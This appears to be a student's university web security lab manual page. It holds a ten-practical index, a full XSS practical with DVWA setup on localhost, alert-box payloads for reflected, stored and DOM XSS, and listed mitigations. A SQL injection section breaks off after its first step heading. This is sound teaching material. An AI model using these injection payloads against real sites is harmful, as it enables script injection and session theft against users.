@@ -1,0 +1,673 @@
+<!doctype html><html lang=en dir=ltr class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Sem-5/Practical/WAS" data-has-hydrated=false><head><meta charset=UTF-8><meta name=generator content="Docusaurus v3.10.2"><title data-rh=true>WAS Laboratory | Ankur's Page</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"/><meta data-rh=true name=twitter:image content=https://ankur3-101106.github.io/img/seo-banner.png /><meta data-rh=true property=og:url content=https://ankur3-101106.github.io/docs/Sem-5/Practical/WAS /><meta data-rh=true property=og:locale content=en /><meta data-rh=true name=docusaurus_locale content=en /><meta data-rh=true name=docsearch:language content=en /><meta data-rh=true name=author content="Ankur Macwan"/><meta data-rh=true property=og:type content=website /><meta data-rh=true property=og:image content=https://ankur3-101106.github.io/img/seo-banner.png /><meta data-rh=true name=twitter:card content=summary_large_image /><meta data-rh=true name=docusaurus_version content=current /><meta data-rh=true name=docusaurus_tag content=docs-default-current /><meta data-rh=true name=docsearch:version content=current /><meta data-rh=true name=docsearch:docusaurus_tag content=docs-default-current /><meta data-rh=true property=og:title content="WAS Laboratory | Ankur's Page"/><meta data-rh=true name=description content="Comprehensive Web Application Security lab guide covering Burp Suite configuration, SQL injection, XSS exploitation, CSRF, and defense testing."/><meta data-rh=true property=og:description content="Comprehensive Web Application Security lab guide covering Burp Suite configuration, SQL injection, XSS exploitation, CSRF, and defense testing."/><meta data-rh=true name=keywords content="was laboratory,web security practicals,burp suite lab,sql injection testing,xss exploitation"/><link data-rh=true rel=icon href=/img/favicon.jpg /><link data-rh=true rel=canonical href=https://ankur3-101106.github.io/docs/Sem-5/Practical/WAS /><link data-rh=true rel=alternate href=https://ankur3-101106.github.io/docs/Sem-5/Practical/WAS hreflang=en /><link data-rh=true rel=alternate href=https://ankur3-101106.github.io/docs/Sem-5/Practical/WAS hreflang=x-default /><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://ankur3-101106.github.io/docs/category/sem-5","name":"Sem 5","position":1},{"@type":"ListItem","item":"https://ankur3-101106.github.io/docs/category/practicals","name":"Practicals","position":2},{"@type":"ListItem","item":"https://ankur3-101106.github.io/docs/Sem-5/Practical/WAS","name":"WAS Laboratory","position":3}]}</script><link rel=alternate type=application/rss+xml href=/blog/rss.xml title="Ankur's Page RSS Feed"><link rel=alternate type=application/atom+xml href=/blog/atom.xml title="Ankur's Page Atom Feed"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css type=text/css><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"><link rel=stylesheet href=/assets/css/styles.2f3db842.css /><script src=/assets/js/runtime~main.ac7d4ea3.js defer></script><script src=/assets/js/main.2563b13f.js defer></script></head><body><svg style="display: none;"><defs>
+<symbol id=theme-svg-external-link viewBox="0 0 24 24"><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
+</defs></svg>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme-142")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><link rel=preload as=image href=/img/favicon.jpg /><div role=region aria-label="Skip to main content"><a class=skipToContent_fXgn href=#__docusaurus_skipToContent_fallback>Skip to main content</a></div><nav aria-label=Main class="theme-layout-navbar navbar navbar--fixed-top"><div class=navbar__inner><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/><div class=navbar__logo><img src=/img/favicon.jpg alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"/><img src=/img/favicon.jpg alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"/></div><b class="navbar__title text--truncate">Ankur's Page</b></a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/docs/intro>Notes</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href=https://github.com/ankur3-101106 target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_nPIU><use href=#theme-svg-external-link /></svg></a><div class="navbar__item clock-navbar-item" style=display:flex;align-items:center><span id=localTime>--:--:--</span></div><div class=navbarSearchContainer_Bca1><div class="navbar__search searchBarContainer_NW3z" dir=ltr><input placeholder=Search aria-label=Search class="navbar__search-input searchInput_YFbd" value="" /><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type=button disabled title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class=docsWrapper_hBAB><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type=button></button><div class=docRoot_UBD9><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class=sidebarViewport_aRkj><div class=sidebar_njMd><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class=menu__link href=/docs/intro><span class=linkLabel_WmDU>Introduction</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_byQd menu__link menu__link--sublist" href=/docs/category/sem-4><span class=categoryLinkLabel_W154>Sem 4</span></a><button aria-label="Expand sidebar category 'Sem 4'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href=/docs/category/sem-5><span class=categoryLinkLabel_W154>Sem 5</span></a><button aria-label="Collapse sidebar category 'Sem 5'" aria-expanded=true type=button class="clean-btn menu__caret"></button></div><ul class=menu__list><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex=0 href=/docs/category/practicals><span class=categoryLinkLabel_W154>Practicals</span></a><button aria-label="Collapse sidebar category 'Practicals'" aria-expanded=true type=button class="clean-btn menu__caret"></button></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/docs/Sem-5/Practical/DAA><span class=linkLabel_WmDU>DAA Laboratory</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/docs/Sem-5/Practical/WAS><span class=linkLabel_WmDU>WAS Laboratory</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/docs/Sem-5/Practical/MAS><span class=linkLabel_WmDU>MAS Laboratory</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/docs/Sem-5/Practical/MFW><span class=linkLabel_WmDU>MFW Laboratory</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex=0 href=/docs/category/theory><span class=categoryLinkLabel_W154>Theory</span></a><button aria-label="Expand sidebar category 'Theory'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div></ul><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class=menu__link href=/docs/docusaurus_seo_optimization_master_guide><span class=linkLabel_WmDU>Complete SEO Optimization Guide for Your Docusaurus Website</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class=menu__link href=/docs/format><span class=linkLabel_WmDU>Structure Format for Unit PPT/PDF outline</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class=menu__link href=/docs/hacks><span class=linkLabel_WmDU>Hacks</span></a></ul></nav></div></div></aside><main class=docMainContainer_TBSr><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_VOVn"><div class=docItemContainer_Djhp><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label=Breadcrumbs><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label="Home page" class=breadcrumbs__link href=/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_YNFT><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><a class=breadcrumbs__link href=/docs/category/sem-5><span>Sem 5</span></a><li class=breadcrumbs__item><a class=breadcrumbs__link href=/docs/category/practicals><span>Practicals</span></a><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>WAS Laboratory</span></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type=button class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>WAS Laboratory</h1></header><div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class=admonitionHeading_Gvgb><span class=admonitionIcon_Rf37><svg viewBox="0 0 14 16"><path fill-rule=evenodd d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"/></svg></span>LABORATORY MANUAL OVERVIEW</div><div class=admonitionContent_BuS1><ul>
+<li class=""><strong>Course Title:</strong> Web Application Security Laboratory</li>
+<li class=""><strong>Course Code:</strong> 303105321</li>
+<li class=""><strong>Department:</strong> Computer Science and Engineering</li>
+<li class=""><strong>Semester:</strong> 5th Semester</li>
+<li class=""><strong>Academic Session:</strong> 2026-27</li>
+</ul></div></div>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=practical-assessment-index>Practical Assessment Index<a href=#practical-assessment-index class=hash-link aria-label="Direct link to Practical Assessment Index" title="Direct link to Practical Assessment Index" translate=no>​</a></h2>
+<table><thead><tr><th style=text-align:center>Sr. No.<th style=text-align:left>Experiment Title<th style=text-align:left>Security Domain / Focus<th style=text-align:left>Key Tools & Platforms<tbody><tr><td style=text-align:center>1<td style=text-align:left>Cross-Site Scripting (XSS) Attacks<td style=text-align:left>Client-Side Injection (Reflected, Stored, DOM)<td style=text-align:left>DVWA, XAMPP, Browser DevTools<tr><td style=text-align:center>2<td style=text-align:left>SQL Injection (SQLi) Attacks<td style=text-align:left>Database Injection & Union-Based Data Extraction<td style=text-align:left>DVWA, MySQL, Burp Suite<tr><td style=text-align:center>3<td style=text-align:left>Cross-Site Request Forgery (CSRF) Attacks<td style=text-align:left>Session-Riding & Unauthorized State Changes<td style=text-align:left>Burp Suite, PortSwigger Academy, CSRF PoC<tr><td style=text-align:center>4<td style=text-align:left>Broken Authentication & Session Management<td style=text-align:left>Credential Spraying & Username Enumeration<td style=text-align:left>Burp Suite Intruder, Hydra<tr><td style=text-align:center>5<td style=text-align:left>Web Application Firewall (WAF) Evasion<td style=text-align:left>Signature Bypass & Encoding Obfuscation<td style=text-align:left>Wafw00f, WhatWaf, Python<tr><td style=text-align:center>6<td style=text-align:left>Information Leakage & Sensitive Data Exposure<td style=text-align:left>Error-Based Reconnaissance & Stack Disclosure<td style=text-align:left>Burp Suite Repeater, HTTP History<tr><td style=text-align:center>7<td style=text-align:left>File Inclusion & Web Shell Attacks<td style=text-align:left>Arbitrary File Upload & Remote Code Execution<td style=text-align:left>Burp Suite, PHP Web Shell, PortSwigger<tr><td style=text-align:center>8<td style=text-align:left>Clickjacking (UI Redressing) Attacks<td style=text-align:left>Transparent Iframe Overlay & Decoy Tricking<td style=text-align:left>CSS Layering, Burp Suite Exploit Server<tr><td style=text-align:center>9<td style=text-align:left>Security Configuration Issues (Path Traversal)<td style=text-align:left>Arbitrary File Retrieval via Dot-Dot-Slash<td style=text-align:left>Burp Suite Repeater, <code>/etc/passwd</code><tr><td style=text-align:center>10<td style=text-align:left>Input Validation, Sanitization & Command Injection<td style=text-align:left>OS Command Chaining & Input Neutralization<td style=text-align:left>DVWA, Command Separators (<code>;</code>, <code>&</code>, `</table>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=1-practical-1-cross-site-scripting-xss-attacks>1. Practical 1: Cross-Site Scripting (XSS) Attacks<a href=#1-practical-1-cross-site-scripting-xss-attacks class=hash-link aria-label="Direct link to 1. Practical 1: Cross-Site Scripting (XSS) Attacks" title="Direct link to 1. Practical 1: Cross-Site Scripting (XSS) Attacks" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=11-aim>1.1 Aim<a href=#11-aim class=hash-link aria-label="Direct link to 1.1 Aim" title="Direct link to 1.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Test a web application for Cross-Site Scripting (XSS) vulnerabilities and demonstrate how an attacker can exploit them to execute arbitrary scripts in the victim's browser.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=12-theory--core-concepts>1.2 Theory & Core Concepts<a href=#12-theory--core-concepts class=hash-link aria-label="Direct link to 1.2 Theory & Core Concepts" title="Direct link to 1.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Cross-Site Scripting (XSS)</strong>: An injection attack where malicious executable scripts are delivered to unsuspecting users through a trusted web application. The victim's browser has no way of knowing the script is untrusted and executes it with the full privileges of the origin.</li>
+<li class=""><strong>Attack Objectives</strong>:<!-- -->
+<ul>
+<li class="">Session cookie hijacking (<code>document.cookie</code>).</li>
+<li class="">Account takeover and unauthorized actions.</li>
+<li class="">Page defacement and arbitrary phishing redirects.</li>
+</ul>
+</li>
+<li class=""><strong>Classification of XSS</strong>:<!-- -->
+<ul>
+<li class=""><strong>Reflected XSS (Non-Persistent)</strong>: The payload is submitted via HTTP request parameters (e.g., search queries, form inputs) and immediately reflected back in the HTTP response without persistence. Requires social engineering (tricking a victim into clicking a crafted URL).</li>
+<li class=""><strong>Stored XSS (Persistent)</strong>: The injected script is permanently stored in the target database, comment section, message board, or visitor log. Every user retrieving that page executes the script.</li>
+<li class=""><strong>DOM-Based XSS</strong>: The vulnerability resides completely in client-side JavaScript. Untrusted data from a <strong>Source</strong> (e.g., <code>location.search</code>, <code>document.URL</code>) flows into an execution <strong>Sink</strong> (e.g., <code>document.write()</code>, <code>innerHTML</code>, <code>eval()</code>) without reaching the server.</li>
+</ul>
+</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=13-tools--environment>1.3 Tools & Environment<a href=#13-tools--environment class=hash-link aria-label="Direct link to 1.3 Tools & Environment" title="Direct link to 1.3 Tools & Environment" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Environment</strong>: XAMPP (Apache + MySQL)</li>
+<li class=""><strong>Target Application</strong>: Damn Vulnerable Web Application (DVWA)</li>
+<li class=""><strong>Browser</strong>: Chromium / Firefox Developer Edition</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=14-step-by-step-implementation>1.4 Step-by-Step Implementation<a href=#14-step-by-step-implementation class=hash-link aria-label="Direct link to 1.4 Step-by-Step Implementation" title="Direct link to 1.4 Step-by-Step Implementation" translate=no>​</a></h3>
+<ol>
+<li class="">
+<p><strong>Setup & Initialization</strong>:</p>
+<ul>
+<li class="">Start <strong>Apache</strong> and <strong>MySQL</strong> modules from the XAMPP Control Panel.</li>
+<li class="">Place DVWA in <code>C:\xampp\htdocs\dvwa</code>.</li>
+<li class="">Edit <code>config.inc.php</code> to configure database credentials:<!-- -->
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-php codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token variable" style=color:#36acaa>$_DVWA</span><span class="token punctuation" style=color:#393A34>[</span><span class="token string single-quoted-string" style=color:#e3116c>'db_user'</span><span class="token punctuation" style=color:#393A34>]</span><span class="token plain"> </span><span class="token operator" style=color:#393A34>=</span><span class="token plain"> </span><span class="token string single-quoted-string" style=color:#e3116c>'root'</span><span class="token punctuation" style=color:#393A34>;</span><span class="token plain"></span><br/></div><div class=token-line style=color:#393A34><span class="token plain"></span><span class="token variable" style=color:#36acaa>$_DVWA</span><span class="token punctuation" style=color:#393A34>[</span><span class="token string single-quoted-string" style=color:#e3116c>'db_password'</span><span class="token punctuation" style=color:#393A34>]</span><span class="token plain"> </span><span class="token operator" style=color:#393A34>=</span><span class="token plain"> </span><span class="token string single-quoted-string" style=color:#e3116c>''</span><span class="token punctuation" style=color:#393A34>;</span><br/></div></code></pre></div></div>
+</li>
+<li class="">Open <code>http://127.0.0.1/dvwa/setup.php</code> and click <strong>Create / Reset Database</strong>.</li>
+<li class="">Log in using default credentials (<code>admin</code> / <code>password</code>) and navigate to <strong>DVWA Security</strong> to set the security level to <strong>Low</strong>.</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Reflected XSS Execution</strong>:</p>
+<ul>
+<li class="">Navigate to the <strong>XSS (Reflected)</strong> tab.</li>
+<li class="">Enter payload into the input field:<!-- -->
+<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-html codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>script</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token script language-javascript function" style=color:#d73a49>alert</span><span class="token script language-javascript punctuation" style=color:#393A34>(</span><span class="token script language-javascript string" style=color:#e3116c>"Hacked"</span><span class="token script language-javascript punctuation" style=color:#393A34>)</span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>script</span><span class="token tag punctuation" style=color:#393A34>></span><br/></div></code></pre></div></div>
+</li>
+<li class="">Submit the form. The browser executes the injected JavaScript and renders an alert dialog.</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Stored XSS Execution</strong>:</p>
+<ul>
+<li class="">Navigate to the <strong>XSS (Stored)</strong> tab.</li>
+<li class="">In the <strong>Guestbook Name</strong> and <strong>Message</strong> fields, enter:<!-- -->
+<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-html codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>script</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token script language-javascript function" style=color:#d73a49>alert</span><span class="token script language-javascript punctuation" style=color:#393A34>(</span><span class="token script language-javascript string" style=color:#e3116c>"Stored XSS Exploit"</span><span class="token script language-javascript punctuation" style=color:#393A34>)</span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>script</span><span class="token tag punctuation" style=color:#393A34>></span><br/></div></code></pre></div></div>
+</li>
+<li class="">Click <strong>Sign Guestbook</strong>. The payload is committed to the backend MySQL database.</li>
+<li class="">Refresh the page or access it from a different browser session; the script executes automatically upon each page visit.</li>
+</ul>
+</li>
+<li class="">
+<p><strong>DOM-Based XSS Execution</strong>:</p>
+<ul>
+<li class="">Navigate to the <strong>XSS (DOM)</strong> tab.</li>
+<li class="">Modify the language selection URL parameter:<!-- -->
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-text codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=&lt;script>alert("DOM_XSS")&lt;/script></span><br/></div></code></pre></div></div>
+</li>
+<li class="">Press Enter. The client-side script parses <code>location.href</code> and writes the payload directly into the DOM via <code>document.location</code>, triggering the alert.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=15-mitigation--countermeasures>1.5 Mitigation & Countermeasures<a href=#15-mitigation--countermeasures class=hash-link aria-label="Direct link to 1.5 Mitigation & Countermeasures" title="Direct link to 1.5 Mitigation & Countermeasures" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Context-Aware Output Encoding</strong>: HTML entity encode characters (<code>&lt;</code>, <code>></code>, <code>&</code>, <code>"</code>, <code>'</code>) before writing dynamic data into HTML body, attributes, or script contexts.</li>
+<li class=""><strong>Input Validation</strong>: Use strict server-side allowlists.</li>
+<li class=""><strong>Content Security Policy (CSP)</strong>: Deploy strict CSP headers restricting script origins and blocking inline scripts (<code>script-src 'self'</code>).</li>
+<li class=""><strong>Cookie Flags</strong>: Mark authentication cookies with <code>HttpOnly</code> to prevent JavaScript access via <code>document.cookie</code>.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=16-conclusion>1.6 Conclusion<a href=#16-conclusion class=hash-link aria-label="Direct link to 1.6 Conclusion" title="Direct link to 1.6 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Successfully demonstrated Reflected, Stored, and DOM-based XSS attacks on DVWA. The exercise proves that failing to sanitize inputs and encode outputs permits arbitrary code execution in user browsers.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=2-practical-2-sql-injection-sqli-attacks>2. Practical 2: SQL Injection (SQLi) Attacks<a href=#2-practical-2-sql-injection-sqli-attacks class=hash-link aria-label="Direct link to 2. Practical 2: SQL Injection (SQLi) Attacks" title="Direct link to 2. Practical 2: SQL Injection (SQLi) Attacks" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=21-aim>2.1 Aim<a href=#21-aim class=hash-link aria-label="Direct link to 2.1 Aim" title="Direct link to 2.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Gain hands-on experience in identifying and exploiting SQL Injection (SQLi) vulnerabilities to read, extract, and manipulate backend database records.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=22-theory--core-concepts>2.2 Theory & Core Concepts<a href=#22-theory--core-concepts class=hash-link aria-label="Direct link to 2.2 Theory & Core Concepts" title="Direct link to 2.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>SQL Injection (SQLi)</strong>: Occurs when untrusted user input is directly concatenated into a dynamic SQL query without proper sanitization or parameterization.</li>
+<li class=""><strong>SQLi Categories</strong>:<!-- -->
+<ul>
+<li class=""><strong>In-Band SQLi (Classic)</strong>: Data retrieval and error messages occur through the same communication channel.<!-- -->
+<ul>
+<li class=""><em>Error-Based</em>: Forcing syntax errors that leak database schema details.</li>
+<li class=""><em>Union-Based</em>: Combining results of the original query with an attacker-crafted query using the <code>UNION</code> operator.</li>
+</ul>
+</li>
+<li class=""><strong>Inferential SQLi (Blind)</strong>: No data is displayed directly in responses.<!-- -->
+<ul>
+<li class=""><em>Boolean Blind</em>: Measuring true/false application behavior changes based on injected conditions.</li>
+<li class=""><em>Time-Based Blind</em>: Injecting database sleep calls (e.g., <code>SLEEP(5)</code>) to infer data bit-by-bit from response latency.</li>
+</ul>
+</li>
+<li class=""><strong>Out-of-Band SQLi</strong>: Triggering external DNS or HTTP requests from the database server to exfiltrate data.</li>
+</ul>
+</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=23-step-by-step-implementation>2.3 Step-by-Step Implementation<a href=#23-step-by-step-implementation class=hash-link aria-label="Direct link to 2.3 Step-by-Step Implementation" title="Direct link to 2.3 Step-by-Step Implementation" translate=no>​</a></h3>
+<ol>
+<li class="">
+<p><strong>Target Environment</strong>:</p>
+<ul>
+<li class="">Access <strong>DVWA</strong> at <code>http://127.0.0.1/dvwa/</code>.</li>
+<li class="">Set <strong>DVWA Security</strong> to <strong>Low</strong>.</li>
+<li class="">Navigate to the <strong>SQL Injection</strong> tab.</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Fingerprinting & Version Identification</strong>:</p>
+<ul>
+<li class="">Determine number of columns and verify database version:<!-- -->
